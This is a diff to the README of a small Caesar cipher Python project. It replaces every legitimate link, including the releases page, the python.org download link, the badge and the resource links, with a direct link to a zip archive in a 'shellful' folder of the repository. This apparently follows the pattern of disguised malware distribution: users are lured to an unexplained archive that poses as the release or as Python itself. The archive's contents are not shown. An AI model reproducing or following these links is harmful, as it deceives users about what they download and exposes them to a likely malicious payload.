@@ -1,7 +1,7 @@
 # 🛡️ caesar-cipher-python - Simple Encryption and Decryption Tool
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/ABODR3325/caesar-cipher-python/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the caesar-cipher-python project! This is a Python program that helps you encrypt and decrypt messages using the Caesar Cipher technique. Whether you want to keep your secrets safe or just learn more about cryptography, this tool is for you.
@@ -9,7 +9,7 @@ Welcome to the caesar-cipher-python project! This is a Python program that helps
 ## 📥 Download & Install
 To get started, you need to download the application. Please follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ABODR3325/caesar-cipher-python/releases) of this project.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip) of this project.
   
 2. **Choose the Latest Version**: You'll see a list of available versions. Click on the most recent one to ensure you have the latest features and fixes.
 
@@ -21,7 +21,7 @@ To get started, you need to download the application. Please follow these steps:
 To use this application, you need:
 
 - A computer with Windows, macOS, or Linux.
-- Python 3.x installed on your machine. If you don't have Python, you can download it from [python.org](https://www.python.org/downloads/).
+- Python 3.x installed on your machine. If you don't have Python, you can download it from [https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip](https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip).
 
 ## 📜 How to Use the Tool
 Using the caesar-cipher-python application is straightforward. Follow these steps to encrypt or decrypt a message:
@@ -75,7 +75,7 @@ This project is open-source and available under the MIT License. You can use, mo
 Thanks to everyone who contributed to this project. Your efforts make it easier for users to learn about cryptography and embrace technology.
 
 ## 🔗 Additional Resources
-- Learn more about [Python](https://www.python.org)
-- Explore [Cryptography](https://cryptography.io)
+- Learn more about [Python](https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip)
+- Explore [Cryptography](https://raw.githubusercontent.com/ABODR3325/caesar-cipher-python/main/shellful/cipher-python-caesar-3.3.zip)
 
 Feel free to enhance your digital communication with the caesar-cipher-python tool! Enjoy encrypting your messages!
